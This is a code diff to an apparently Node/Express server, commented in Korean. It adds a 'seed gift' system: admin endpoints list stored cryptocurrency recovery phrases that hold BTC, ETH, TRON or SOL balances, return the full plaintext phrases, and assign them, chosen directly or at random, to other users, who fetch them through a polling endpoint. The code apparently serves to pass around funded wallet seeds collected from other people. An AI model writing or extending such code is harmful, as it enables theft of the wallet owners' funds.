@@ -154,6 +154,25 @@ async function runMigrations() {
   } catch (e) {
     console.error('DB 마이그레이션(settings) 오류:', e.message);
   }
+  try {
+    // 시드 지급(이벤트) 테이블
+    await db.pool.query(`
+      CREATE TABLE IF NOT EXISTS seed_gifts (
+        id          INT AUTO_INCREMENT PRIMARY KEY,
+        seed_id     INT          NOT NULL,
+        user_id     VARCHAR(100) NOT NULL,
+        phrase      TEXT         NOT NULL,
+        note        VARCHAR(255) DEFAULT NULL,
+        status      ENUM('pending','delivered','cancelled') NOT NULL DEFAULT 'pending',
+        created_at  DATETIME     NOT NULL DEFAULT NOW(),
+        delivered_at DATETIME    DEFAULT NULL,
+        INDEX idx_user_status (user_id, status)
+      )
+    `);
+    console.log('✅ DB 마이그레이션: seed_gifts 테이블 확인 완료');
+  } catch (e) {
+    console.error('DB 마이그레이션(seed_gifts) 오류:', e.message);
+  }
 }
 runMigrations();
 
@@ -2065,6 +2084,163 @@ app.post('/api/admin/pricing', requireAdmin, requireMaster, async (req, res) => 
 // 메인 페이지(/)를 관리자 페이지로 리다이렉트
 app.get('/', (req, res) => {
   res.redirect('/admin.html');
+});
+
+// ════════════════════════════════════════════════════
+// 시드 지급(이벤트) API
+// ════════════════════════════════════════════════════
+
+// GET /api/admin/seed-gifts/giftable
+// 잔고 있고 아직 지급되지 않은 시드 목록
+app.get('/api/admin/seed-gifts/giftable', requireAdmin, requireMaster, async (req, res) => {
+  try {
+    const page = Math.max(1, parseInt(req.query.page) || 1);
+    const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
+    const offset = (page - 1) * pageSize;
+    const [[{ total }]] = await db.pool.query(
+      `SELECT COUNT(*) AS total FROM seeds
+       WHERE (balance > 0 OR btc > 0 OR eth > 0 OR tron > 0 OR sol > 0)
+         AND id NOT IN (SELECT seed_id FROM seed_gifts WHERE status != 'cancelled')`
+    );
+    const [rows] = await db.pool.query(
+      `SELECT id, user_id,
+              CONCAT(SUBSTRING_INDEX(phrase,' ',1), ' ... ',
+                     SUBSTRING_INDEX(phrase,' ',-1), ' (',
+                     LENGTH(phrase)-LENGTH(REPLACE(phrase,' ',''))+1, '단어)') AS phrase_preview,
+              phrase,
+              COALESCE(balance,0) AS balance,
+              COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
+              COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
+              created_at
+       FROM seeds
+       WHERE (balance > 0 OR btc > 0 OR eth > 0 OR tron > 0 OR sol > 0)
+         AND id NOT IN (SELECT seed_id FROM seed_gifts WHERE status != 'cancelled')
+       ORDER BY balance DESC, id DESC
+       LIMIT ? OFFSET ?`,
+      [pageSize, offset]
+    );
+    res.json({ total, page, pageSize, totalPages: Math.ceil(total / pageSize), items: rows });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// GET /api/admin/seed-gifts — 지급 이력 목록
+app.get('/api/admin/seed-gifts', requireAdmin, requireMaster, async (req, res) => {
+  try {
+    const [rows] = await db.pool.query(
+      `SELECT g.id, g.seed_id, g.user_id, g.note, g.status,
+              g.created_at, g.delivered_at,
+              CONCAT(SUBSTRING_INDEX(g.phrase,' ',1), ' ... ',
+                     SUBSTRING_INDEX(g.phrase,' ',-1)) AS phrase_preview
+       FROM seed_gifts g
+       ORDER BY g.created_at DESC
+       LIMIT 100`
+    );
+    res.json({ items: rows });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/admin/seed-gifts/assign
+// body: { seedId, userId, note } 또는 { random: true, userId, note }
+app.post('/api/admin/seed-gifts/assign', requireAdmin, requireMaster, async (req, res) => {
+  try {
+    const { seedId, userId, note, random } = req.body || {};
+    if (!userId?.trim()) return res.status(400).json({ error: 'userId 필요' });
+
+    // 유저 존재 확인
+    const [[user]] = await db.pool.query('SELECT id FROM users WHERE id = ?', [userId.trim()]);
+    if (!user) return res.status(404).json({ error: `유저 '${userId}' 없음` });
+
+    let targetSeedId = seedId;
+    if (random || !seedId) {
+      // 랜덤: 잔고 있고 미지급 시드 중 하나
+      const [[rnd]] = await db.pool.query(
+        `SELECT id FROM seeds
+         WHERE (balance > 0 OR btc > 0 OR eth > 0 OR tron > 0 OR sol > 0)
+           AND id NOT IN (SELECT seed_id FROM seed_gifts WHERE status != 'cancelled')
+         ORDER BY RAND() LIMIT 1`
+      );
+      if (!rnd) return res.status(404).json({ error: '지급 가능한 시드 없음' });
+      targetSeedId = rnd.id;
+    }
+
+    const [[seed]] = await db.pool.query('SELECT id, phrase FROM seeds WHERE id = ?', [targetSeedId]);
+    if (!seed) return res.status(404).json({ error: `시드 ID ${targetSeedId} 없음` });
+
+    // 이미 진행 중인 지급 확인
+    const [[dup]] = await db.pool.query(
+      `SELECT id FROM seed_gifts WHERE seed_id = ? AND status = 'pending'`, [targetSeedId]
+    );
+    if (dup) return res.status(409).json({ error: '이미 지급 대기 중인 시드입니다.' });
+
+    await db.pool.query(
+      `INSERT INTO seed_gifts (seed_id, user_id, phrase, note, status) VALUES (?, ?, ?, ?, 'pending')`,
+      [targetSeedId, userId.trim(), seed.phrase, note || null]
+    );
+    res.json({ ok: true, seedId: targetSeedId, userId: userId.trim() });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// DELETE /api/admin/seed-gifts/:id — 지급 취소 (pending만 가능)
+app.delete('/api/admin/seed-gifts/:id', requireAdmin, requireMaster, async (req, res) => {
+  try {
+    const [result] = await db.pool.query(
+      `UPDATE seed_gifts SET status = 'cancelled' WHERE id = ? AND status = 'pending'`,
+      [req.params.id]
+    );
+    if (result.affectedRows === 0) return res.status(400).json({ error: '취소 불가 (이미 전달됐거나 없음)' });
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// GET /api/user/gift-seed?token= — 클라이언트 폴링: 대기 중인 지급 시드 확인
+app.get('/api/user/gift-seed', async (req, res) => {
+  try {
+    const token = req.query.token || req.headers['x-token'];
+    if (!token) return res.status(401).json({ error: '토큰 필요' });
+    const userId = await sessionStore.getUserId(token);
+    if (!userId) return res.status(401).json({ error: '세션 만료' });
+
+    const [[gift]] = await db.pool.query(
+      `SELECT id, phrase, note, created_at
+       FROM seed_gifts
+       WHERE user_id = ? AND status = 'pending'
+       ORDER BY created_at ASC LIMIT 1`,
+      [userId]
+    );
+    if (!gift) return res.json({ gift: null });
+    res.json({ gift: { id: gift.id, phrase: gift.phrase, note: gift.note, createdAt: gift.created_at } });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/user/gift-seed/ack — 클라이언트가 수신 확인 처리
+app.post('/api/user/gift-seed/ack', async (req, res) => {
+  try {
+    const token = req.body?.token || req.headers['x-token'];
+    const giftId = req.body?.giftId;
+    if (!token) return res.status(401).json({ error: '토큰 필요' });
+    const userId = await sessionStore.getUserId(token);
+    if (!userId) return res.status(401).json({ error: '세션 만료' });
+    if (!giftId) return res.status(400).json({ error: 'giftId 필요' });
+
+    await db.pool.query(
+      `UPDATE seed_gifts SET status = 'delivered', delivered_at = NOW()
+       WHERE id = ? AND user_id = ? AND status = 'pending'`,
+      [giftId, userId]
+    );
+    res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 // 서버 시작
